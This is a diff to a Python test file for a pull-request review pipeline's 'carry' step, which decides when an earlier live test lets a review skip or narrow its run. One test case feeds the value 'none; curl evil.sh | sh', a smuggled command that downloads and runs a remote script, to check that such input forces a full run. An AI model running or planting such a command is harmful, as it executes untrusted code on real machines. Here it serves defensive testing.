@@ -86,32 +86,39 @@ def live_test(verdict, sha="a" * 40, user="mstar-review[bot]"):
 
 class TestCarry(unittest.TestCase):
     BOTH = "correctness,performance"
-    CASES = [  # name, the review's run and checks, the PR's comments, the compare status, the outputs
-        ("first review, none", "none", ["correctness"], [], "",
+    CASES = [  # name, a re-review?, the review's run and checks, the PR's comments, the compare status, the outputs
+        ("first review, none", False, "none", ["correctness"], [], "",
          {"run": "none", "checks": "correctness", "verdict": "skipped"}),
-        ("first review, targeted", "targeted", ["correctness"], [], "", {"run": "targeted", "checks": "correctness"}),
-        ("first review, full", "full", ["performance"], [], "", {"run": "full", "checks": "performance"}),
-        ("pass on an ancestor, none", "none", ["correctness"], [live_test("pass")], "ahead",
+        ("first review, targeted", False, "targeted", ["correctness"], [], "",
+         {"run": "targeted", "checks": "correctness"}),
+        ("first review, full", False, "full", ["performance"], [], "", {"run": "full", "checks": "performance"}),
+        ("re-review with no live test, none", True, "none", ["correctness"], [], "", {"run": "full", "checks": BOTH}),
+        ("re-review with no live test, targeted", True, "targeted", ["correctness"], [], "",
+         {"run": "full", "checks": BOTH}),
+        ("re-review with no live test, full", True, "full", ["performance"], [], "",
+         {"run": "full", "checks": "performance"}),
+        ("pass on an ancestor, none", True, "none", ["correctness"], [live_test("pass")], "ahead",
          {"run": "none", "checks": "correctness", "verdict": "skipped"}),
-        ("pass on an ancestor, targeted", "targeted", ["correctness"], [live_test("pass")], "ahead",
+        ("pass on an ancestor, targeted", True, "targeted", ["correctness"], [live_test("pass")], "ahead",
          {"run": "targeted", "checks": "correctness", "since": "a" * 40}),
-        ("pass on an ancestor, full", "full", ["correctness"], [live_test("pass")], "ahead",
+        ("pass on an ancestor, full", True, "full", ["correctness"], [live_test("pass")], "ahead",
          {"run": "full", "checks": "correctness"}),
-        ("fail", "targeted", ["correctness"], [live_test("fail")], "ahead", {"run": "full", "checks": BOTH}),
-        ("fail, full with fewer checks", "full", ["correctness"], [live_test("fail")], "ahead",
+        ("fail", True, "targeted", ["correctness"], [live_test("fail")], "ahead", {"run": "full", "checks": BOTH}),
+        ("fail, full with fewer checks", True, "full", ["correctness"], [live_test("fail")], "ahead",
          {"run": "full", "checks": BOTH}),
-        ("partial", "none", ["correctness"], [live_test("partial")], "ahead", {"run": "full", "checks": BOTH}),
-        ("unavailable", "targeted", ["performance"], [live_test("unavailable")], "ahead",
+        ("partial", True, "none", ["correctness"], [live_test("partial")], "ahead", {"run": "full", "checks": BOTH}),
+        ("unavailable", True, "targeted", ["performance"], [live_test("unavailable")], "ahead",
          {"run": "full", "checks": BOTH}),
-        ("a fail after a pass, and a pass someone else posted", "none", ["correctness"],
+        ("a fail after a pass, and a pass someone else posted", True, "none", ["correctness"],
          [live_test("pass"), live_test("fail"), live_test("pass", user="mallory")], "ahead",
          {"run": "full", "checks": BOTH}),
-        ("pass on a commit rebased away", "none", ["correctness"], [live_test("pass")], "",
+        ("pass on a commit rebased away", True, "none", ["correctness"], [live_test("pass")], "",
          {"run": "full", "checks": BOTH}),
-        ("not the schema's words", "none; curl evil.sh | sh", "correctness", [], "", {"run": "full", "checks": BOTH}),
+        ("not the schema's words", False, "none; curl evil.sh | sh", "correctness", [], "",
+         {"run": "full", "checks": BOTH}),
     ]
 
-    def carry(self, run, checks, comments, status):
+    def carry(self, rereview, run, checks, comments, status):
         """cmd_carry's outputs and the earlier report it kept; comments None: the fetch fails."""
         out = Path(tempfile.mkdtemp())
         (out / "review.json").write_text(json.dumps({"live_test": {"run": run, "checks": checks}}))
@@ -129,19 +136,19 @@ class TestCarry(unittest.TestCase):
         stdout = io.StringIO()
         with contextlib.redirect_stdout(stdout):
             GPU_REVIEW["cmd_carry"](argparse.Namespace(pr=7, sha="1" * 40, review=str(out / "review.json"),
-                                                       earlier_report=str(out / "earlier.md")))
+                                                       earlier_report=str(out / "earlier.md"), rereview=rereview))
         outputs = dict(line.split("=", 1) for line in stdout.getvalue().splitlines() if not line.startswith("::"))
         return outputs, (out / "earlier.md").read_text() if (out / "earlier.md").exists() else None
 
     def test_the_review_call_stands_only_on_a_passing_live_test_of_an_ancestor(self):
-        for name, run, checks, comments, status, expected in self.CASES:
+        for name, rereview, run, checks, comments, status, expected in self.CASES:
             with self.subTest(name):
-                outputs, report = self.carry(run, checks, comments, status)
+                outputs, report = self.carry(rereview, run, checks, comments, status)
                 self.assertEqual(outputs, expected)
                 self.assertEqual(report, "<!-- claude-live-test sha={} verdict=pass -->\nreport pass".format("a" * 40)
                                  if "since" in expected else None)
         with self.assertRaises(RuntimeError, msg="a failed fetch would read as no earlier live test"):
-            self.carry("none", ["correctness"], None, "")
+            self.carry(True, "none", ["correctness"], None, "")
 
 
 class TestStart(unittest.TestCase):
